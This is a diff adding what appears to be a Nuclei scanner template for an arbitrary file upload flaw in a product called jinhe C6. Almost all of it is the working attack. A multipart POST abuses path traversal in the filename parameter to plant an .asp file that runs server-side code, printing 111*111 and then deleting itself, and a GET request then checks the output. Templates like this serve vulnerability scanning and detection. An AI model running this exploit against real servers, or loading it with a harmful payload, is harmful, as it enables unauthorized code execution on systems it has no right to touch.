@@ -1,0 +1,40 @@
+id: jinhe-c6-UploadFileEditorSave-fileupload
+
+info:
+  name: jinhe-c6-UploadFileEditorSave-fileupload
+  author: msk
+  severity: high
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\{{filename}}.asp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.jpg"
+        Content-Type: image/png
+
+        <% response.write(111*111)
+        set myfso=server.CreateObject("scripting.filesystemobject") 
+        myfso.DeleteFile(Server.MapPath("{{filename}}.asp"))%>
+
+        ------{{boundary}}--
+
+      - |
+        GET /C6/{{filename}}.asp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"12321")
